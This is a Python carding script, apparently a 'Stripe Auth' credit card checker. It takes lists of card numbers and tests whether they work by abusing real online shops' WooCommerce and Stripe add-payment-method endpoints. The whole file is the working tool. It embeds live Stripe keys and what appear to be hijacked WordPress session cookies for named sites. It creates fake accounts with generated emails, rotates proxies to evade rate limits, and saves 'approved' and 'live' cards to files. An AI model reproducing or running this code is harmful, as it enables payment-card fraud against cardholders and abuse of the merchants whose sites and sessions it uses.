import requests
import sys
try:
    import cloudscraper
except ImportError:
    cloudscraper = None
import os
import time
import concurrent.futures
import threading
import re
import random
import datetime
import uuid
from faker import Faker

if sys.platform == 'win32':
    os.system('chcp 65001 > nul')

faker = Faker()

RED = '\033[1;31m'
GREEN = '\033[1;32m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
PURPLE = '\033[1;35m'
CYAN = '\033[1;36m'
RESET = '\033[0m'

CARD_ICON = '⊀ 𝐂𝐚𝐫𝐝 ↬'
GATE_ICON = '⊀ 𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↬'
STATUS_ICON = '⊀ 𝑺𝒕𝒂𝒕𝒖𝒔 ↬'
RESP_ICON = '⊀ 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↬'
BRAND_ICON = '⊀ 𝐁𝐫𝐚𝐧𝐝 ↬'
BANK_ICON = '⊀ 𝐁𝐚𝐧𝐤 ↬'
COUNTRY_ICON = '⊀ 𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↬'
DEV_ICON = '⌬ 𝐃𝐞𝐯 ↬'

STATUS_FONTS = {
    "APPROVED": "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃",
    "LIVE": "𝐋𝐈𝐕𝐄",
    "3DS": "𝟑𝐃𝐒",
    "DECLINED": "𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃",
    "ERROR": "𝐄𝐑𝐑𝐎𝐑"
}

print_lock = threading.Lock()
stats = {"approved": 0, "live": 0, "3ds": 0, "declined": 0, "error": 0}

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def banner():
    try:
        clear()
        print(f"{BLUE}")
        print("      █████╗ ██╗   ██╗████████╗██╗  ██╗")
        print("     ██╔══██╗██║   ██║╚══██╔══╝██║  ██║")
        print("     ███████║██║   ██║   ██║   ███████║")
        print("     ██╔══██║██║   ██║   ██║   ██╔══██║")
        print("     ██║  ██║╚██████╔╝   ██║   ██║  ██║")
        print("     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝  ╚═╝")
        print(f"          {CYAN}Created by {GREEN}@Xoarch {RESET}| {RED}@ScriptDung{RESET}\n")
    except UnicodeEncodeError:
        pass

def get_bin_info(bin_code):
    try:
        res = requests.get(f"https://bins.antipublic.cc/bins/{bin_code}", timeout=10)
        if res.status_code == 200:
            data = res.json()
            brand = data.get('brand', 'UNKNOWN')
            bank = data.get('bank', 'UNKNOWN')
            country = data.get('country_name', 'UNKNOWN')
            flag = data.get('country_flag', '')
            return brand, bank, country, flag
    except:
        pass
    return "UNKNOWN", "UNKNOWN", "UNKNOWN", ""

def extract_message(response):
    try:
        response_json = response.json()
        if 'message' in response_json: return response_json['message']
        if 'data' in response_json:
            data = response_json['data']
            if isinstance(data, dict):
                if 'message' in data: return data['message']
                if 'error' in data and isinstance(data['error'], dict):
                    return data['error'].get('message', str(data['error']))
        if 'error' in response_json:
            err = response_json['error']
            if isinstance(err, dict): return err.get('message', str(err))
            return str(err)
        for value in response_json.values():
            if isinstance(value, dict) and 'message' in value: return value['message']
        return f"Message not found. Status: {response.status_code}"
    except:
        if "so soon" in response.text.lower() or "too many" in response.text.lower():
            return "Rate Limit"
        match = re.search(r'"message":"(.*?)"', response.text)
        if match: return match.group(1)
        return "Unknown error"

proxies_list = []

def get_random_proxy():
    return None

GATEWAYS = [
    {
        "name": "Early Learning",
        "stripe_key": "pk_live_51FPDDoGHLDAy2EYzTZfqegcW1BoeDFkRAWAUxEpmi4FI0veROv421lMi7kUOABffgtwipuvItBz2vSSOuhj3o8vJ00w0aJMvBo",
        "ajax_url": "https://earlylearningcafe.com/wp-admin/admin-ajax.php",
        "cookies": {
            'wordpress_sec_501af1f0f253ec649f322a4d5f08b584': 'ahmedsarla%7C1776181894%7CW2nHIaScykhr6hjUSUnl6RkYQUeNIVj4yXRLpbTvgr0%7C32b89c3ca1d4c97d7b6f5c1d5c56bcd834c0d920f871ba6c5766a223336b00e3',
            '__wpdm_client': '965d4edd035a3fac1e14e6fc7fde0c38',
            'wordpress_logged_in_501af1f0f253ec649f322a4d5f08b584': 'ahmedsarla%7C1776181894%7CW2nHIaScykhr6hjUSUnl6RkYQUeNIVj4yXRLpbTvgr0%7C36ac8c246cdd632d00499205912dea2b04df6b45ea9483a4674b8d0b8b834951',
        },
        "nonce": "05797cb7f0"
    },
    {
        "name": "Equii Est",
        "stripe_key": "pk_live_51JXoSUKHaiw9oeF1eRiJufLS4Q69DDfDmTGWQo6kCkHPDQEjgkwUZJ8MyiNxCYzIEoDXOusPyipTV4jyyfqD9FxN004eSzpGG5",
        "ajax_url": "https://equii-est.co.uk/wp-admin/admin-ajax.php",
        "cookies": {
            'wordpress_sec_5119b9fe1b7f0118c0cb75dc9c1ae652': 'virusfr%7C1776240158%7Cpm8KphFvXPFoKZCvRLeihQ6ih098nZ7inkS0XduUFLH%7C851cce3f5a76c26752dafb52bcd5211b3a6408c7e3799b316fb9ae9e81dc227b',
            'wordpress_logged_in_5119b9fe1b7f0118c0cb75dc9c1ae652': 'virusfr%7C1776240158%7Cpm8KphFvXPFoKZCvRLeihQ6ih098nZ7inkS0XduUFLH%7C5dcf6379f6df9e659ae3de02b4c19f392961f55566936e805727d5fce9d0d37a',
        },
        "nonce": "2435d4756a"
    },
    {
        "name": "Dila Boards",
        "url": "https://dilaboards.com/en/moj-racun/add-payment-method/",
        "ajax_url": "https://dilaboards.com/en/",
    }
]

def format_proxy(p, p_type="http"):
    if not p: return None
    p = p.strip()
    if "://" in p: p = p.split("://")[-1]
    pre = "socks4://" if p_type == "socks4" else ("socks5://" if p_type == "socks5" else "http://")
    if "@" in p: return f"{pre}{p}"
    parts = p.split(':')
    if len(parts) == 4:
        if parts[1].isdigit(): return f"{pre}{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        return f"{pre}{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
    return f"{pre}{p}"

def check_cc(cc_full, proxy=None, proxy_type="http"):
    session = requests.Session()
    if proxy:
        formatted_proxy = format_proxy(proxy, proxy_type)
        session.proxies = {"http": formatted_proxy, "https": formatted_proxy}
    try:
        data_parts = cc_full.strip().split('|')
        cc, mm, yy, cvv = data_parts[0], data_parts[1], data_parts[2], data_parts[3].replace('.', '')
    except:
        return "ERROR", "Invalid format", "UNKNOWN"
    for gw in GATEWAYS:
        try:
            user_ag = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36'
            current_cookies = gw.get("cookies", {})
            current_nonce = gw.get("nonce", "")
            current_pk = gw.get("stripe_key", "")
            ajax_url = gw["ajax_url"]
            if "dilaboards.com" in gw.get("url", ""):
                try:
                    url_1 = gw["url"]
                    h_pre = {
                        'User-Agent': user_ag,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Alt-Used': 'dilaboards.com',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'none',
                        'Sec-Fetch-User': '?1',
                        'Priority': 'u=0, i',
                    }
                    r_pre = session.get(url_1, headers=h_pre, timeout=15)
                    reg_nonce = re.findall('name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)[0]
                    current_pk = re.findall('"key":"(.*?)"', r_pre.text)[0]
                    h_reg = {
                        'User-Agent': user_ag,
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://dilaboards.com',
                        'Alt-Used': 'dilaboards.com',
                        'Connection': 'keep-alive',
                        'Referer': url_1,
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'same-origin',
                        'Sec-Fetch-User': '?1',
                        'Priority': 'u=0, i',
                    }
                    reg_data = {
                        'email': faker.email(domain="gmail.com"),
                        'wc_order_attribution_source_type': 'typein',
                        'wc_order_attribution_referrer': '(none)',
                        'wc_order_attribution_utm_campaign': '(none)',
                        'wc_order_attribution_utm_source': '(direct)',
                        'wc_order_attribution_utm_medium': '(none)',
                        'wc_order_attribution_utm_content': '(none)',
                        'wc_order_attribution_utm_id': '(none)',
                        'wc_order_attribution_utm_term': '(none)',
                        'wc_order_attribution_utm_source_platform': '(none)',
                        'wc_order_attribution_utm_creative_format': '(none)',
                        'wc_order_attribution_utm_marketing_tactic': '(none)',
                        'wc_order_attribution_session_entry': url_1,
                        'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                        'wc_order_attribution_session_pages': '2',
                        'wc_order_attribution_session_count': '1',
                        'wc_order_attribution_user_agent': user_ag,
                        'woocommerce-register-nonce': reg_nonce,
                        '_wp_http_referer': '/en/moj-racun/add-payment-method/',
                        'register': 'Register',
                    }
                    r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
                    if "so soon" in r_reg.text.lower() or "too many" in r_reg.text.lower():
                        return "ERROR", "Rate Limit", "UNKNOWN"
                    current_nonce = re.findall('"createAndConfirmSetupIntentNonce":"(.*?)"', r_reg.text)[0]
                    current_cookies = session.cookies.get_dict()
                except:
                    return "ERROR", "Registration Failed", "UNKNOWN"
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            ele_id = f"src_{random.getrandbits(128):032x}"
            h1 = {
                'User-Agent': user_ag,
                'Accept': 'application/json',
                'Referer': 'https://js.stripe.com/',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://js.stripe.com',
            }
            d1 = {
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'allow_redisplay': 'unspecified',
                'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
                'billing_details[address][country]': 'US',
                'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
                'referrer': gw.get("url", "https://dilaboards.com"),
                'time_on_page': str(random.randint(10000, 99999)),
                'client_attribution_metadata[client_session_id]': ele_id,
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': ele_id,
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': guid,
                'muid': muid,
                'sid': sid,
                'key': current_pk,
                '_stripe_version': '2024-06-20',
            }
            r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
            res1 = r1.json()
            if "error" in res1:
                msg = res1["error"].get("message", "Declined")
                if "security code is" in msg.lower():
                    return "LIVE", msg, res1.get("card", {}).get("brand", "UNKNOWN")
                continue
            pm_id = res1["id"]
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            h2 = {
                'User-Agent': user_ag,
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'X-Requested-With': 'XMLHttpRequest',
                'Referer': gw.get("url", ajax_url),
            }
            d2 = {
                'action': 'create_and_confirm_setup_intent',
                'wc-stripe-payment-method': pm_id,
                'wc-stripe-payment-type': 'card',
                '_ajax_nonce': current_nonce,
            }
            final_ajax_url = f"{ajax_url}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
            r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
            if r2.status_code == 429: continue
            res2 = r2.json()
            success = res2.get('success', False)
            status_val = res2.get('data', {}).get('status', 'unknown')
            if success or status_val == 'succeeded':
                return "APPROVED", "Payment method added successfully.", brand
            msg = extract_message(r2)
            if "so soon" in msg.lower() or "too many" in msg.lower(): 
                return "ERROR", "Rate Limit", brand
            if "security code is" in msg.lower(): return "LIVE", msg, brand
            if "authenticate" in msg.lower() or "challenge" in msg.lower() or "3d" in msg.lower():
                return "3DS", "3DS", brand
            return "DECLINED", msg, brand
        except Exception as e:
            continue
    return "ERROR", "Gateway Rate Limited", "UNKNOWN"

def build_block(cc_line, status, response, brand, bank, country, flag, use_color=True):
    st_font = STATUS_FONTS.get(status, status)
    P = PURPLE if use_color else ""
    R = RESET if use_color else ""
    return (
        f"  {P}───────────────────────────────────────{R}\n"
        f"  {CARD_ICON} {cc_line}\n"
        f"  {GATE_ICON} 𝗦𝘁𝗿𝗶𝗽𝗲 𝗔𝘂𝘁𝗵\n"
        f"  {STATUS_ICON} {st_font}\n"
        f"  {RESP_ICON} {response}\n"
        f"  {BRAND_ICON} {brand}\n"
        f"  {BANK_ICON} {bank}\n"
        f"  {COUNTRY_ICON} {country} {flag}\n"
        f"  {DEV_ICON} @Xoarch\n"
        f"  {P}───────────────────────────────────────{R}"
    )

def save_result(block, status):
    filename = f"{status.lower()}.txt"
    with open(filename, "a", encoding="utf-8") as f:
        f.write(block + "\n\n")

def worker(cc_line, use_proxy=False, proxy_type="http"):
    status, response, brand_auto = "ERROR", "Initial", "UNKNOWN"
    for attempt in range(3):
        proxy = random.choice(proxies_list) if use_proxy and proxies_list else None
        status, response, brand_auto = check_cc(cc_line, proxy=proxy, proxy_type=proxy_type)
        if status != "ERROR":
            break
        time.sleep(2)
    bin_code = cc_line[:6]
    brand_bin, bank, country, flag = get_bin_info(bin_code)
    brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
    color = RED
    if status == "APPROVED": 
        color = GREEN
        stats["approved"] += 1
    elif status == "LIVE": 
        color = BLUE
        stats["live"] += 1
    elif status == "3DS": 
        color = YELLOW
        stats["3ds"] += 1
    elif status == "ERROR":
        color = PURPLE
        stats["error"] += 1
    else:
        stats["declined"] += 1
    st_font = STATUS_FONTS.get(status, status)
    with print_lock:
        print(f"{color}{cc_line} - {st_font}{RESET}")
        if status in ["APPROVED", "LIVE", "3DS"]:
            display_block = build_block(cc_line, status, response, brand, bank, country, flag, use_color=True)
            save_block = build_block(cc_line, status, response, brand, bank, country, flag, use_color=False)
            save_result(save_block, status)
    time.sleep(random.randint(2, 5))

def main():
    global proxies_list
    if os.path.exists("proxy.txt"):
        with open("proxy.txt", "r") as f:
            proxies_list = [line.strip() for line in f if line.strip()]
    while True:
        banner()
        if proxies_list:
            print(f"    {GREEN}PROXIES LOADED: {len(proxies_list)}{RESET}")
        print(f"    {BLUE}[1] SINGLE MODE")
        print(f"    [2] MASS MODE")
        print(f"    [3] EXIT{RESET}")
        choice = input(f"\n{YELLOW}Select Mode: {RESET}")
        if choice == '1':
            cc_input_val = input(f"{YELLOW}Enter your cc (format: cc|mm|yy|cvv): {RESET}").strip()
            if not cc_input_val: continue
            print(f"{BLUE}Checking...{RESET}")
            status, response, brand_auto = check_cc(cc_input_val)
            if status == "ERROR":
                print(f"{RED}Error: {response}{RESET}")
                input("\nPress enter to continue...")
                continue
            bin_code = cc_input_val[:6]
            brand_bin, bank, country, flag = get_bin_info(bin_code)
            brand = brand_bin if brand_bin != "UNKNOWN" else brand_auto.title()
            color = RED
            if status == "APPROVED": color = GREEN
            elif status == "LIVE": color = BLUE
            elif status == "3DS": color = YELLOW
            block = build_block(cc_input_val, status, response, brand, bank, country, flag, use_color=True)
            print(f"\n{color}{block}{RESET}")
            if status in ["APPROVED", "LIVE", "3DS"]:
                save_block = build_block(cc_input_val, status, response, brand, bank, country, flag, use_color=False)
                save_result(save_block, status)
            input(f"\n{YELLOW}Press enter to go back...{RESET}")
        elif choice == '2':
            file_path = input(f"{YELLOW}Enter your cc file: {RESET}").strip()
            if not os.path.exists(file_path):
                print(f"{RED}File not found! {file_path}{RESET}")
                time.sleep(2)
                continue
            print(f"\n{BLUE}[1] HTTP/S\n[2] SOCKS4\n[3] SOCKS5\n[4] PROXYLESS{RESET}")
            p_type_idx = input(f"{YELLOW}Enter proxy type: {RESET}").strip()
            use_prx = False
            p_type = "http"
            if p_type_idx in ['1', '2', '3']:
                p_file = input(f"{YELLOW}Enter your proxy file: {RESET}").strip()
                if os.path.exists(p_file):
                    with open(p_file, "r") as f:
                        proxies_list = [line.strip() for line in f if line.strip()]
                    use_prx = True
                    if p_type_idx == '2': p_type = "socks4"
                    elif p_type_idx == '3': p_type = "socks5"
                    print(f"{GREEN}Loaded {len(proxies_list)} proxies.{RESET}")
                else:
                    print(f"{RED}Proxy file not found! Going proxyless.{RESET}")
                    time.sleep(1)
            try:
                threads_input = input(f"{YELLOW}Enter thread count (default 5): {RESET}").strip()
                threads = int(threads_input) if threads_input else 5
            except ValueError: threads = 5
            banner()
            try:
                with open(file_path, "r", encoding="utf-8") as f:
                    ccs = [line.strip() for line in f if line.strip()]
            except UnicodeDecodeError:
                with open(file_path, "r", encoding="cp1252") as f:
                    ccs = [line.strip() for line in f if line.strip()]
            stats["approved"] = 0
            stats["live"] = 0
            stats["3ds"] = 0
            stats["declined"] = 0
            from functools import partial
            worker_with_args = partial(worker, use_proxy=use_prx, proxy_type=p_type)
            with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                executor.map(worker_with_args, ccs)
            print(f"\n{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {GREEN}𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃: {stats['approved']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {BLUE}𝐋𝐈𝐕𝐄    : {stats['live']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {YELLOW}𝟑𝐃𝐒     : {stats['3ds']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {RED}𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃: {stats['declined']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"   {PURPLE}𝐄𝐑𝐑𝐎𝐑𝐒   : {stats['error']}{RESET}")
            print(f"{CYAN}  ───────────────────────────────────────{RESET}")
            print(f"{CYAN}Check completed successfully! Detailed results saved.{RESET}")
            input(f"\n{YELLOW}Press enter to go back...{RESET}")
        elif choice == '3':
            print(f"{PURPLE}Exiting...{RESET}")
            break
        else:
            print(f"{RED}Invalid Choice!{RESET}")
            time.sleep(1)

if __name__ == "__main__":
    main()
